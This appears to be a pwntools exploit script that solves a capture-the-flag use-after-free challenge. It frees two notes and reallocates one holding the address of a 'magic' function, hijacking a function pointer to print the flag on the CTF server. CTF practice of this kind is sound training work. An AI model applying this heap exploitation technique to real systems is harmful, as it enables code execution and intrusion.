#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3020)
e = ELF("./uaf")

menu = " :"

# Create 2 Note
p.sendlineafter(menu, "1")
p.sendlineafter(menu, "929")
p.sendlineafter(menu, "Yena's Birthday")

p.sendlineafter(menu, "1")
p.sendlineafter(menu, "509")
p.sendlineafter(menu, "Yeju's BirthDay")

# Delete Both Note
p.sendlineafter(menu, "2")
p.sendlineafter(menu, "0")

p.sendlineafter(menu, "2")
p.sendlineafter(menu, "1")

# Spoof Second Note Pointer

p.sendlineafter(menu, "1")
p.sendlineafter(menu, "8")
p.sendlineafter(menu, p32(e.symbols['magic']))

# Read Flag

p.sendlineafter(menu, "3")
p.sendlineafter(menu, "0")

log.info(p.recvline().decode('utf-8'))
